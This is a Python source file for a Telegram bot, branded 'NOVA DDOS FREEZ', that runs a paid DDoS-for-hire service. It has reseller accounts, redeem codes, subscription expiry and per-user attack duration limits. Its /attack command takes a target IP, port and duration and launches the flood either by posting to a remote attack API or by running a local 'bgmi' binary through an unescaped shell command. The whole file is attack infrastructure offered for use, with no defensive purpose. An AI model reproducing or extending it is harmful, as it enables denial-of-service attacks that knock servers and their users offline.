import os
import socket
import subprocess
import asyncio
import pytz
import platform
import random
import string
import requests
import json
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext, filters, MessageHandler
from pymongo import MongoClient
from datetime import datetime, timedelta, timezone
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Database Configuration
MONGO_URI = os.getenv('MONGO_URI')
client = MongoClient(MONGO_URI)
db = client['Kamisama']
users_collection = db['bgmi']
settings_collection = db['settings0']
redeem_codes_collection = db['redeem_codes0']
resellers_collection = db['resellers']
group_settings_collection = db['group_settings']

# Bot Configuration
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
ADMIN_USER_ID = int(os.getenv('ADMIN_USER_ID'))

# API Configuration
API_KEY = os.getenv('API_KEY')
BASE_URL = os.getenv('BASE_URL')
ATTACK_MODE = os.getenv('ATTACK_MODE', 'api')  # 'api' or 'local'

# Default attack duration limit (in seconds)
DEFAULT_ATTACK_TIME_LIMIT = 120  # 2 minutes default

async def help_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    user_data = users_collection.find_one({"user_id": user_id})
    is_reseller = user_data.get('is_reseller', False) if user_data else False

    if user_id == ADMIN_USER_ID:
        help_text = (
            "*💡 Available Commands for Admins:*\n\n"
            "*🔸 /start* - Start the bot.\n"
            "*🔸 /attack* - Start the attack.\n"
            "*🔸 /add [user_id] [days/minutes]* - Add a user.\n"
            "*🔸 /remove [user_id]* - Remove a user.\n"
            "*🔸 /users* - List all allowed users.\n"
            "*🔸 /gen* - Generate a redeem code.\n"
            "*🔸 /redeem* - Redeem a code.\n"
            "*🔸 /delete_code* - Delete a redeem code.\n"
            "*🔸 /list_codes* - List all redeem codes.\n"
            "*🔸 /add_reseller [user_id]* - Add a reseller.\n"
            "*🔸 /remove_reseller [user_id]* - Remove a reseller.\n"
            "*🔸 /resellers* - List all resellers.\n"
            "*🔸 /broadcast [message]* - Broadcast message to all users.\n"
            "*🔸 /add_group [group_id]* - Add group for attack access.\n"
            "*🔸 /remove_group [group_id]* - Remove group from attack access.\n"
            "*🔸 /groups* - List all allowed groups.\n"
            "*🔸 /set_mode [local/api]* - Set attack mode.\n"
            "*🔸 /set_time [user_id] [seconds]* - Set attack time limit for a user.\n"
            "*🔸 /view_time [user_id]* - View user's attack time limit.\n"
        )
    elif is_reseller:
        help_text = (
            "*💡 Available Commands for Resellers:*\n\n"
            "*🔸 /start* - Start the bot.\n"
            "*🔸 /attack* - Start the attack.\n"
            "*🔸 /add [user_id] [days/minutes]* - Add a user (reseller).\n"
            "*🔸 /remove [user_id]* - Remove a user (reseller).\n"
            "*🔸 /users* - List your users.\n"
            "*🔸 /gen* - Generate a redeem code.\n"
            "*🔸 /redeem* - Redeem a code.\n"
            "*🔸 /broadcast [message]* - Broadcast to your users.\n"
            "*🔸 /set_time [user_id] [seconds]* - Set attack time limit for your user.\n"
            "*🔸 /view_time [user_id]* - View user's attack time limit.\n"
        )
    else:
        help_text = (
            "*Here are the commands you can use:* \n\n"
            "*🔸 /start* - Start interacting with the bot.\n"
            "*🔸 /attack* - Trigger an attack operation.\n"
            "*🔸 /redeem* - Redeem a code.\n"
        )
    await context.bot.send_message(chat_id=update.effective_chat.id, text=help_text, parse_mode='Markdown')

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check if user is allowed
    if not await is_user_allowed(user_id):
        # Check if it's a group and group is allowed
        if update.effective_chat.type in ['group', 'supergroup']:
            if not await is_group_allowed(chat_id):
                await context.bot.send_message(chat_id=chat_id, text="*❌ This group is not authorized to use this bot!*", parse_mode='Markdown')
                return
        else:
            await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
            return

    # Get user's attack time limit
    user_time_limit = await get_user_attack_time_limit(user_id)
    
    message = (
        f"*🔥 Welcome to NOVA DDOS FREEZ world 🔥*\n\n"
        f"*Use /attack <ip> <port> <duration>*\n"
        f"*Your max attack duration: {user_time_limit} seconds*\n"
        f"*Let the war begin! ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def set_attack_time(update: Update, context: CallbackContext):
    """Set attack time limit for a user (Admin/Reseller command)"""
    user_id = update.effective_user.id
    user_data = users_collection.find_one({"user_id": user_id})
    is_reseller = user_data.get('is_reseller', False) if user_data else False
    
    # Check authorization
    if user_id != ADMIN_USER_ID and not is_reseller:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to set attack time limits!*", parse_mode='Markdown')
        return
    
    if len(context.args) != 2:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /set_time <user_id> <seconds>*\n*Example: /set_time 123456789 300 (5 minutes)*", parse_mode='Markdown')
        return
    
    try:
        target_user_id = int(context.args[0])
        attack_time_limit = int(context.args[1])
        
        if attack_time_limit <= 0:
            await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Attack time must be greater than 0 seconds!*", parse_mode='Markdown')
            return
        
        # Check if reseller has permission to modify this user
        if is_reseller and user_id != ADMIN_USER_ID:
            user_check = users_collection.find_one({"user_id": target_user_id, "added_by": user_id})
            if not user_check:
                await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You can only modify users you have added!*", parse_mode='Markdown')
                return
        
        # Update user's attack time limit
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"attack_time_limit": attack_time_limit}},
            upsert=True
        )
        
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text=f"*✅ Attack time limit for user {target_user_id} set to {attack_time_limit} seconds.*", 
            parse_mode='Markdown'
        )
    except ValueError:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Please provide valid user ID and seconds!*", parse_mode='Markdown')

async def view_attack_time(update: Update, context: CallbackContext):
    """View attack time limit for a user"""
    user_id = update.effective_user.id
    user_data = users_collection.find_one({"user_id": user_id})
    is_reseller = user_data.get('is_reseller', False) if user_data else False
    
    if user_id != ADMIN_USER_ID and not is_reseller:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to view attack time limits!*", parse_mode='Markdown')
        return
    
    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /view_time <user_id>*", parse_mode='Markdown')
        return
    
    try:
        target_user_id = int(context.args[0])
        
        # Check if reseller has permission to view this user
        if is_reseller and user_id != ADMIN_USER_ID:
            user_check = users_collection.find_one({"user_id": target_user_id, "added_by": user_id})
            if not user_check:
                await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You can only view users you have added!*", parse_mode='Markdown')
                return
        
        user = users_collection.find_one({"user_id": target_user_id})
        if user:
            attack_time_limit = user.get('attack_time_limit', DEFAULT_ATTACK_TIME_LIMIT)
            await context.bot.send_message(
                chat_id=update.effective_chat.id, 
                text=f"*📊 User {target_user_id} attack time limit: {attack_time_limit} seconds*", 
                parse_mode='Markdown'
            )
        else:
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*⚠️ User {target_user_id} not found!*", parse_mode='Markdown')
    except ValueError:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Please provide valid user ID!*", parse_mode='Markdown')

async def get_user_attack_time_limit(user_id):
    """Get user's attack time limit from database"""
    user = users_collection.find_one({"user_id": user_id})
    if user:
        return user.get('attack_time_limit', DEFAULT_ATTACK_TIME_LIMIT)
    return DEFAULT_ATTACK_TIME_LIMIT

async def add_user(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    user_data = users_collection.find_one({"user_id": user_id})
    is_reseller = user_data.get('is_reseller', False) if user_data else False
    
    if user_id != ADMIN_USER_ID and not is_reseller:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to add users!*", parse_mode='Markdown')
        return

    if len(context.args) != 2:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /add <user_id> <days/minutes>*", parse_mode='Markdown')
        return

    target_user_id = int(context.args[0])
    time_input = context.args[1]

    # Extract numeric value and unit from the input
    if time_input[-1].lower() == 'd':
        time_value = int(time_input[:-1])
        total_seconds = time_value * 86400
    elif time_input[-1].lower() == 'm':
        time_value = int(time_input[:-1])
        total_seconds = time_value * 60
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Please specify time in days (d) or minutes (m).*", parse_mode='Markdown')
        return

    expiry_date = datetime.now(timezone.utc) + timedelta(seconds=total_seconds)

    # Add or update user in the database
    update_data = {
        "expiry_date": expiry_date,
        "attack_time_limit": DEFAULT_ATTACK_TIME_LIMIT
    }
    
    if is_reseller and user_id != ADMIN_USER_ID:
        update_data["added_by"] = user_id
    
    users_collection.update_one(
        {"user_id": target_user_id},
        {"$set": update_data},
        upsert=True
    )

    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ User {target_user_id} added with expiry in {time_value} {time_input[-1]}.*\n*Default attack time limit: {DEFAULT_ATTACK_TIME_LIMIT} seconds*", parse_mode='Markdown')

async def remove_user(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    user_data = users_collection.find_one({"user_id": user_id})
    is_reseller = user_data.get('is_reseller', False) if user_data else False
    
    if user_id != ADMIN_USER_ID and not is_reseller:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to remove users!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /remove <user_id>*", parse_mode='Markdown')
        return

    target_user_id = int(context.args[0])
    
    # Check if reseller has permission to remove this user
    if is_reseller and user_id != ADMIN_USER_ID:
        user_check = users_collection.find_one({"user_id": target_user_id, "added_by": user_id})
        if not user_check:
            await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You can only remove users you have added!*", parse_mode='Markdown')
            return
    
    users_collection.delete_one({"user_id": target_user_id})
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ User {target_user_id} removed.*", parse_mode='Markdown')

async def is_user_allowed(user_id):
    user = users_collection.find_one({"user_id": user_id})
    if user:
        expiry_date = user.get('expiry_date')
        if expiry_date:
            if expiry_date.tzinfo is None:
                expiry_date = expiry_date.replace(tzinfo=timezone.utc)
            if expiry_date > datetime.now(timezone.utc):
                return True
    return False

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check if user is allowed
    if not await is_user_allowed(user_id):
        if update.effective_chat.type in ['group', 'supergroup']:
            if not await is_group_allowed(chat_id):
                await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
                return
        else:
            await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
            return

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args
    
    # Check duration limit
    try:
        duration_int = int(duration)
        user_time_limit = await get_user_attack_time_limit(user_id)
        
        if duration_int > user_time_limit:
            await context.bot.send_message(
                chat_id=chat_id, 
                text=f"*❌ Attack duration exceeds your limit!*\n*Your max duration: {user_time_limit} seconds*\n*Requested: {duration_int} seconds*", 
                parse_mode='Markdown'
            )
            return
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Duration must be a number!*", parse_mode='Markdown')
        return

    await context.bot.send_message(chat_id=chat_id, text=( 
        f"*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Let the battlefield ignite! 💥*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

async def run_attack(chat_id, ip, port, duration, context):
    try:
        if ATTACK_MODE == 'api':
            # Use API attack
            response = requests.post(
                f"{BASE_URL}/api/v1/attack",
                json={"ip": ip, "port": int(port), "duration": int(duration)},
                headers={"x-api-key": API_KEY, "Content-Type": "application/json"},
                timeout=30
            )
            
            if response.status_code == 200:
                result = response.json()
                await context.bot.send_message(chat_id=chat_id, text=f"*✅ Attack sent via API!*\n*Response: {result}*", parse_mode='Markdown')
            else:
                await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ API Error: {response.status_code}*", parse_mode='Markdown')
        else:
            # Use local attack
            process = await asyncio.create_subprocess_shell(
                f"./bgmi {ip} {port} {duration} 900",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await process.communicate()

            if stdout:
                print(f"[stdout]\n{stdout.decode()}")
            if stderr:
                print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')

async def generate_redeem_code(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    user_data = users_collection.find_one({"user_id": user_id})
    is_reseller = user_data.get('is_reseller', False) if user_data else False
    
    if user_id != ADMIN_USER_ID and not is_reseller:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*❌ You are not authorized to generate redeem codes!*", 
            parse_mode='Markdown'
        )
        return

    if len(context.args) < 1:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*⚠️ Usage: /gen [custom_code] <days/minutes> [max_uses]*", 
            parse_mode='Markdown'
        )
        return

    max_uses = 1
    custom_code = None

    if context.args[0][-1].lower() in ['d', 'm']:
        time_input = context.args[0]
        redeem_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
    else:
        custom_code = context.args[0]
        time_input = context.args[1] if len(context.args) > 1 else None
        redeem_code = custom_code

    if time_input is None or time_input[-1].lower() not in ['d', 'm']:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*⚠️ Please specify time in days (d) or minutes (m).*", 
            parse_mode='Markdown'
        )
        return

    if time_input[-1].lower() == 'd':
        time_value = int(time_input[:-1])
        expiry_date = datetime.now(timezone.utc) + timedelta(days=time_value)
        expiry_label = f"{time_value} day(s)"
    elif time_input[-1].lower() == 'm':
        time_value = int(time_input[:-1])
        expiry_date = datetime.now(timezone.utc) + timedelta(minutes=time_value)
        expiry_label = f"{time_value} minute(s)"

    if len(context.args) > (2 if custom_code else 1):
        try:
            max_uses = int(context.args[2] if custom_code else context.args[1])
        except ValueError:
            await context.bot.send_message(
                chat_id=update.effective_chat.id, 
                text="*⚠️ Please provide a valid number for max uses.*", 
                parse_mode='Markdown'
            )
            return

    code_data = {
        "code": redeem_code,
        "expiry_date": expiry_date,
        "used_by": [],
        "max_uses": max_uses,
        "redeem_count": 0
    }
    
    if is_reseller and user_id != ADMIN_USER_ID:
        code_data["created_by"] = user_id
    
    redeem_codes_collection.insert_one(code_data)

    message = (
        f"✅ Redeem code generated: `{redeem_code}`\n"
        f"Expires in {expiry_label}\n"
        f"Max uses: {max_uses}"
    )
    
    await context.bot.send_message(
        chat_id=update.effective_chat.id, 
        text=message, 
        parse_mode='Markdown'
    )

async def redeem_code(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /redeem <code>*", parse_mode='Markdown')
        return

    code = context.args[0]
    redeem_entry = redeem_codes_collection.find_one({"code": code})

    if not redeem_entry:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid redeem code.*", parse_mode='Markdown')
        return

    expiry_date = redeem_entry['expiry_date']
    if expiry_date.tzinfo is None:
        expiry_date = expiry_date.replace(tzinfo=timezone.utc)

    if expiry_date <= datetime.now(timezone.utc):
        await context.bot.send_message(chat_id=chat_id, text="*❌ This redeem code has expired.*", parse_mode='Markdown')
        return

    if redeem_entry['redeem_count'] >= redeem_entry['max_uses']:
        await context.bot.send_message(chat_id=chat_id, text="*❌ This redeem code has already reached its maximum number of uses.*", parse_mode='Markdown')
        return

    if user_id in redeem_entry['used_by']:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You have already redeemed this code.*", parse_mode='Markdown')
        return

    users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"expiry_date": expiry_date, "attack_time_limit": DEFAULT_ATTACK_TIME_LIMIT}},
        upsert=True
    )

    redeem_codes_collection.update_one(
        {"code": code},
        {"$inc": {"redeem_count": 1}, "$push": {"used_by": user_id}}
    )

    await context.bot.send_message(chat_id=chat_id, text="*✅ Redeem code successfully applied!*\n*You can now use the bot.*", parse_mode='Markdown')

async def delete_code(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*❌ You are not authorized to delete redeem codes!*", 
            parse_mode='Markdown'
        )
        return

    if len(context.args) > 0:
        specific_code = context.args[0]
        result = redeem_codes_collection.delete_one({"code": specific_code})
        
        if result.deleted_count > 0:
            await context.bot.send_message(
                chat_id=update.effective_chat.id, 
                text=f"*✅ Redeem code `{specific_code}` has been deleted successfully.*", 
                parse_mode='Markdown'
            )
        else:
            await context.bot.send_message(
                chat_id=update.effective_chat.id, 
                text=f"*⚠️ Code `{specific_code}` not found.*", 
                parse_mode='Markdown'
            )
    else:
        current_time = datetime.now(timezone.utc)
        result = redeem_codes_collection.delete_many({"expiry_date": {"$lt": current_time}})

        if result.deleted_count > 0:
            await context.bot.send_message(
                chat_id=update.effective_chat.id, 
                text=f"*✅ Deleted {result.deleted_count} expired redeem code(s).*", 
                parse_mode='Markdown'
            )
        else:
            await context.bot.send_message(
                chat_id=update.effective_chat.id, 
                text="*⚠️ No expired codes found to delete.*", 
                parse_mode='Markdown'
            )

async def list_codes(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to view redeem codes!*", parse_mode='Markdown')
        return

    if redeem_codes_collection.count_documents({}) == 0:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ No redeem codes found.*", parse_mode='Markdown')
        return

    codes = redeem_codes_collection.find()
    message = "*🎟️ Active Redeem Codes:*\n"
    
    current_time = datetime.now(timezone.utc)
    for code in codes:
        expiry_date = code['expiry_date']
        
        if expiry_date.tzinfo is None:
            expiry_date = expiry_date.replace(tzinfo=timezone.utc)
        
        expiry_date_str = expiry_date.strftime('%Y-%m-%d')
        time_diff = expiry_date - current_time
        remaining_minutes = max(1, time_diff.total_seconds() // 60)
        
        if remaining_minutes >= 60:
            remaining_days = remaining_minutes // 1440
            remaining_hours = (remaining_minutes % 1440) // 60
            remaining_time = f"({remaining_days} days, {remaining_hours} hours)"
        else:
            remaining_time = f"({int(remaining_minutes)} minutes)"
        
        if expiry_date > current_time:
            status = "✅"
        else:
            status = "❌"
            remaining_time = "(Expired)"
        
        message += f"• Code: `{code['code']}`, Expiry: {expiry_date_str} {remaining_time} {status}\n"

    await context.bot.send_message(chat_id=update.effective_chat.id, text=message, parse_mode='Markdown')

async def list_users(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    user_data = users_collection.find_one({"user_id": user_id})
    is_reseller = user_data.get('is_reseller', False) if user_data else False
    
    if user_id != ADMIN_USER_ID and not is_reseller:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to list users!*", parse_mode='Markdown')
        return
    
    current_time = datetime.now(timezone.utc)
    
    if is_reseller and user_id != ADMIN_USER_ID:
        users = users_collection.find({"added_by": user_id})
    else:
        users = users_collection.find()
    
    user_list_message = "👥 User List:\n"
    
    for user in users:
        user_id_val = user['user_id']
        expiry_date = user['expiry_date']
        attack_limit = user.get('attack_time_limit', DEFAULT_ATTACK_TIME_LIMIT)
        
        if expiry_date.tzinfo is None:
            expiry_date = expiry_date.replace(tzinfo=timezone.utc)
    
        time_remaining = expiry_date - current_time
        if time_remaining.days < 0:
            remaining_days = 0
            remaining_hours = 0
            remaining_minutes = 0
            expired = True  
        else:
            remaining_days = time_remaining.days
            remaining_hours = time_remaining.seconds // 3600
            remaining_minutes = (time_remaining.seconds // 60) % 60
            expired = False 
        
        expiry_label = f"{remaining_days}D-{remaining_hours}H-{remaining_minutes}M"
        status_icon = "🔴" if expired else "🟢"
        user_list_message += f"{status_icon} User ID: {user_id_val} - Expiry: {expiry_label} - Attack Limit: {attack_limit}s\n"

    await context.bot.send_message(chat_id=update.effective_chat.id, text=user_list_message, parse_mode='Markdown')

async def add_reseller(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to add resellers!*", parse_mode='Markdown')
        return
    
    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /add_reseller <user_id>*", parse_mode='Markdown')
        return
    
    target_user_id = int(context.args[0])
    
    resellers_collection.update_one(
        {"user_id": target_user_id},
        {"$set": {"is_reseller": True}},
        upsert=True
    )
    
    users_collection.update_one(
        {"user_id": target_user_id},
        {"$set": {"is_reseller": True}},
        upsert=True
    )
    
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ User {target_user_id} is now a reseller!*", parse_mode='Markdown')

async def remove_reseller(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to remove resellers!*", parse_mode='Markdown')
        return
    
    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /remove_reseller <user_id>*", parse_mode='Markdown')
        return
    
    target_user_id = int(context.args[0])
    
    resellers_collection.delete_one({"user_id": target_user_id})
    users_collection.update_one(
        {"user_id": target_user_id},
        {"$set": {"is_reseller": False}}
    )
    
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ User {target_user_id} is no longer a reseller!*", parse_mode='Markdown')

async def list_resellers(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to view resellers!*", parse_mode='Markdown')
        return
    
    resellers = resellers_collection.find()
    message = "*👥 Reseller List:*\n"
    
    for reseller in resellers:
        message += f"• User ID: {reseller['user_id']}\n"
    
    if resellers_collection.count_documents({}) == 0:
        message = "*⚠️ No resellers found.*"
    
    await context.bot.send_message(chat_id=update.effective_chat.id, text=message, parse_mode='Markdown')

async def broadcast(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    user_data = users_collection.find_one({"user_id": user_id})
    is_reseller = user_data.get('is_reseller', False) if user_data else False
    
    if user_id != ADMIN_USER_ID and not is_reseller:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to broadcast messages!*", parse_mode='Markdown')
        return
    
    if not context.args:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /broadcast <message>*", parse_mode='Markdown')
        return
    
    message = ' '.join(context.args)
    
    if is_reseller and user_id != ADMIN_USER_ID:
        users = users_collection.find({"added_by": user_id})
    else:
        users = users_collection.find()
    
    success_count = 0
    fail_count = 0
    
    for user in users:
        try:
            await context.bot.send_message(chat_id=user['user_id'], text=f"*📢 Broadcast Message:*\n\n{message}", parse_mode='Markdown')
            success_count += 1
        except:
            fail_count += 1
    
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=f"*✅ Broadcast completed!\nSent to: {success_count} users\nFailed: {fail_count} users*",
        parse_mode='Markdown'
    )

async def add_group(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to add groups!*", parse_mode='Markdown')
        return
    
    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /add_group <group_id>*", parse_mode='Markdown')
        return
    
    group_id = int(context.args[0])
    
    group_settings_collection.update_one(
        {"group_id": group_id},
        {"$set": {"allowed": True}},
        upsert=True
    )
    
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ Group {group_id} added to allowed groups!*", parse_mode='Markdown')

async def remove_group(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to remove groups!*", parse_mode='Markdown')
        return
    
    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /remove_group <group_id>*", parse_mode='Markdown')
        return
    
    group_id = int(context.args[0])
    
    group_settings_collection.delete_one({"group_id": group_id})
    
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ Group {group_id} removed from allowed groups!*", parse_mode='Markdown')

async def list_groups(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to view groups!*", parse_mode='Markdown')
        return
    
    groups = group_settings_collection.find()
    message = "*👥 Allowed Groups:*\n"
    
    for group in groups:
        message += f"• Group ID: {group['group_id']}\n"
    
    if group_settings_collection.count_documents({}) == 0:
        message = "*⚠️ No allowed groups found.*"
    
    await context.bot.send_message(chat_id=update.effective_chat.id, text=message, parse_mode='Markdown')

async def is_group_allowed(group_id):
    group = group_settings_collection.find_one({"group_id": group_id})
    return group is not None

async def set_attack_mode(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to change attack mode!*", parse_mode='Markdown')
        return
    
    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /set_mode <local/api>*", parse_mode='Markdown')
        return
    
    mode = context.args[0].lower()
    if mode not in ['local', 'api']:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Mode must be 'local' or 'api'*", parse_mode='Markdown')
        return
    
    settings_collection.update_one(
        {"setting": "attack_mode"},
        {"$set": {"value": mode}},
        upsert=True
    )
    
    global ATTACK_MODE
    ATTACK_MODE = mode
    
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ Attack mode set to: {mode.upper()}*", parse_mode='Markdown')

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    # User commands
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("redeem", redeem_code))
    application.add_handler(CommandHandler("help", help_command))
    
    # Admin/Reseller commands
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("remove", remove_user))
    application.add_handler(CommandHandler("users", list_users))
    application.add_handler(CommandHandler("gen", generate_redeem_code))
    application.add_handler(CommandHandler("delete_code", delete_code))
    application.add_handler(CommandHandler("list_codes", list_codes))
    application.add_handler(CommandHandler("broadcast", broadcast))
    
    # Time limit commands
    application.add_handler(CommandHandler("set_time", set_attack_time))
    application.add_handler(CommandHandler("view_time", view_attack_time))
    
    # Reseller commands
    application.add_handler(CommandHandler("add_reseller", add_reseller))
    application.add_handler(CommandHandler("remove_reseller", remove_reseller))
    application.add_handler(CommandHandler("resellers", list_resellers))
    
    # Group commands
    application.add_handler(CommandHandler("add_group", add_group))
    application.add_handler(CommandHandler("remove_group", remove_group))
    application.add_handler(CommandHandler("groups", list_groups))
    
    # Settings commands
    application.add_handler(CommandHandler("set_mode", set_attack_mode))
    
    application.run_polling()

if __name__ == '__main__':
    main()
